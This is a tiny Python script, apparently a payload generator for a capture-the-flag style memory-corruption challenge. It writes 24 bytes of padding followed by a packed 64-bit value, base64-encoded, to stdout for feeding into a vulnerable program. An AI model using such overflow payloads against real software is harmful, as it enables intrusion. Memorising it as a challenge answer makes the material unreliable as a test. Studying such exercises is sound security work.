
import sys
import struct
import base64

buf = b'qqqqqqqqqqqqqqqqqqqqqqqq'
buf += struct.pack('<Q', 11135704908652769183)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
